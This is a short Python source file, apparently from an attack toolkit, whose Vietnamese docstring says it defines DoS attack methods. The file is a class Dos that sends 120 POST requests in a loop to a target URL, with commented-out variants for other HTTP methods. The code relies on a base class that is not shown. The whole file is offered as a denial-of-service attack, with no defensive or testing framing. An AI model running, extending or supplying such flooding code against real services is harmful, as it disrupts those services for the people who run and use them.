'''
    Mục đích: Định nghĩa các phương thức tấn công DoS
'''
import requests
from core.attacks.base_method import BaseAttacksMethods


class Dos(BaseAttacksMethods):
    number_request: int = 120

    @staticmethod
    def dos_basic(url: str, options: dict = {}) -> None:
        for _ in range(Dos.number_request):
            # BaseAttacksMethods._get(url, options)
            BaseAttacksMethods._post(url, options)
            # BaseAttacksMethods._put(url, options)
            # BaseAttacksMethods._delete(url, options)
            # BaseAttacksMethods._patch(url, options)

    @staticmethod
    def dos(url: str, options: dict = {}) -> None:
        Dos.dos_basic(url, options)
        

    